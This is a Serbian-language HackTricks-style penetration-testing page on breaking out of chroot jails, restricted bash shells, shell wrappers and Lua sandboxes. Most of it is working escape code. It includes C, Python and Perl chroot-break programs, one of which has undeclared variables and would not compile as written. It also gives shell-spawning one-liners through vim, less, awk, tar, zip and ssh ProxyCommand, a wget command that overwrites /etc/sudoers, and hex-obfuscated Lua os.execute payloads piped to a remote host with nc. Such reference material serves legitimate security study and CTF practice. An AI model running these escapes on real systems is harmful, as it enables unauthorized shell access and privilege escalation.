# Izlazak iz Jail-ova

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ako možete da izvršite bilo koji binary sa svojstvom "Shell"**

## Izlasci iz Chroot-a

Prema [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mehanizam **nije namenjen odbrani** od namernog neovlašćenog menjanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne ugnježdavaju pravilno, a chroot-ovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot kako bi izašli**.\
Obično to znači da za izlazak morate biti root unutar chroot-a.<sup>[[4]](#references)</sup>

> [!TIP]
> **Tool** [**chw00t**](https://github.com/earthquake/chw00t) je napravljen za zloupotrebu sledećih scenarija i izlazak iz `chroot`-a.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Ako ste **root** unutar chroot-a, **možete izaći** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu da koegzistiraju (u Linux-u), pa ako kreirate folder, a zatim **kreirate novi chroot** u tom novom folderu dok ste **izvan njega**, sada ćete biti **izvan novog chroot-a** i samim tim ćete biti u FS-u.
>
> Ovo se dešava zato što chroot obično NE pomera vaš radni direktorijum na navedeni direktorijum, tako da možete kreirati chroot, a da ostanete izvan njega.<sup>[[4]](#references)[[5]](#references)</sup>

Obično nećete pronaći `chroot` binary unutar chroot jail-a, ali biste mogli da kompajlirate, otpremite i izvršite binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file descriptor trenutnog direktorijuma**, a zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD-u** **izvan** chroot-a, pristupa mu i **izlazi** iz chroot-a.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD može da se prosledi preko Unix Domain Sockets, tako da:
>
> - Kreirajte child proces (fork)
> - Kreirajte UDS kako bi parent i child mogli da komuniciraju
> - Pokrenite chroot u child procesu u drugom folderu
> - U parent procesu kreirajte FD foldera koji se nalazi izvan chroot okruženja novog child procesa
> - Prosledite taj FD child procesu koristeći UDS
> - Child proces izvršava chdir na taj FD i, pošto se nalazi izvan svog chroot okruženja, izaći će iz jail-a.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Mountujte root uređaj (/) u direktorijum unutar chroot-a
> - Izvršite chroot u taj direktorijum
>
> Ovo je moguće u Linux-u.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Mountujte procfs u direktorijum unutar chroot-a (ako već nije)
> - Potražite pid koji ima drugačiji root/cwd unos, kao što je: /proc/1/root
> - Izvršite chroot u taj unos.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Kreirajte Fork (child proces), izvršite chroot u drugi folder dublje u FS-u i uradite CD u njega
> - Iz parent procesa premestite folder u kom se child proces nalazi u folder koji je pre chroot-a child procesa
> - Ovaj child proces će se naći izvan chroot-a.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Da li proces može da se poveže pomoću `ptrace` zavisi od credentials, capabilities i omogućenih security modula kao što je Yama; debugging istog user-a stoga može biti ograničen sistemskom politikom.<sup>[[8]](#references)</sup>
> - Ako je povezivanje dozvoljeno, možete koristiti ptrace nad procesom i izvršiti shellcode unutar njega ([pogledajte ovaj primer](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeracija

Prikupite informacije o jail-u:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Izmena PATH-a

Proverite da li možete da izmenite env varijablu PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim-a

Ako je Vim dostupan, podesite njegovu opciju `shell` na shell koji možete da izvršite i pozovite `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers i help viewer-i

U mnogim ograničenim okruženjima i dalje su dostupni **pagers** ili **help viewers**. Njih je obično brže zloupotrebiti nego pokušavati ponovo izgraditi `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ako je `git` dostupan, njegova opcija `--paginate` šalje izlaz u `less` ili `$PAGER`, što je korisno kada je dostupan pager escape.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Najčešći GTFOBins one-lineri

Kada utvrdite kojim binarnim fajlovima možete pristupiti, prvo testirajte očigledne shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ako možete samo da **ubacite argumente** u dozvoljenu komandu (umesto da je slobodno pokrenete), proverite i **GTFOArgs**.<sup>[[17]](#references)</sup>

### Kreiranje skripte

Proverite da li možete da kreirate izvršnu datoteku sa sadržajem _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijanje bash-a preko SSH-a

Ako pristupate putem ssh-a, često možete zatražiti od servera da izvrši **drugi program** umesto ograničenog login shell-a.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ako je `ssh` jedan od nekoliko lokalno dozvoljenih binarnih fajlova, imajte na umu da se može zloupotrebiti i kao **GTFOBin**; njegove opcije `LocalCommand` i `ProxyCommand` izvršavaju lokalno konfigurisane pomoćne komande.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

U Bash-u, nameref preusmerava dodeljivanja na drugu promenljivu, dok dodavanje elementa u `BASH_CMDS` dodaje tu komandu u Bash-ovu internu hash tabelu komandi.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget-ova opcija `-O` upisuje preuzeti sadržaj u navedenu izlaznu datoteku; ako je ta putanja dostupna za upisivanje, time se može prepisati datoteka kao što je `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ograničeni shell wrapperi (`git-shell`, `rssh`, `lshell`)

Neka okruženja vas ne prebacuju u običan `rbash`, već u **wrapere** kao što su `git-shell`, `rssh` ili `lshell`:

- `git-shell` prihvata samo server-side Git komande, kao i sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da biste izlistali dozvoljene prilagođene akcije. Ako imate mogućnost **upisivanja** u njega, bilo koji izvršni fajl postavljen u taj direktorijum postaje dostupan.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync` ili Git-style operacije. U tim slučajevima se prvo fokusirajte na **file write primitive**: otpremite `authorized_keys`, shell startup fajl ili pomoćnu skriptu na lokaciju u koju možete da upisujete, a zatim se ponovo povežite pomoću `ssh -t ...`.
- Ako wrapper samo filtrira komandnu liniju, izlistajte dostupne binarne fajlove, a zatim pređite na **GTFOBins / GTFOArgs**.

### Ostale tehnike

Takođe proverite:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Mogla bi biti zanimljiva i ova stranica:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Trikove za escaping iz Python jails možete pronaći na sledećoj stranici:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Standardne funkcije `load`, `string.char` i `os.execute` mogu da izgrade i pokrenu ovaj chunk kada su dostupne.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Funkcija tabele može se takođe dobaviti pomoću `rawget`, umesto sintakse sa tačkom.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Koristite `pairs` za nabrajanje tabele biblioteke.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Redosled kojim `pairs` nabraja indekse tabele nije definisan, zato se ne treba oslanjati na to da će se određena funkcija pojaviti prva. Ako treba da izvršite jednu konkretnu funkciju, možete izvesti brute force attack učitavanjem različitih lua okruženja i pozivanjem prve funkcije iz biblioteke.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijanje interaktivnog lua shell-a**: Ako se nalazite unutar ograničenog lua shell-a, možete dobiti novi lua shell (i nadati se da će biti bez ograničenja) pozivanjem `debug.debug()`, čime se ulazi u interaktivni režim.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Kako se izvući iz različitih chroot rešenja (Bucsay Balazs, DeepSec predavanje i slajdovi)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash referentni priručnik – Ograničena ljuska](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git dokumentacija](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux stranica priručnika](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – alat za izlazak iz chroot okruženja](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux stranica priručnika](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux stranica priručnika](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux stranica priručnika](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git dokumentacija](https://git-scm.com/docs/git)
- [10] [:shell – Vim dokumentacija](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash ugrađene komande – GNU Bash referentni priručnik](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash promenljive – GNU Bash referentni priručnik](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget priručnik](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD stranica priručnika](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD stranica priručnika](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 referentni priručnik](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Lista vektora za eksploataciju ubacivanjem argumenata](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
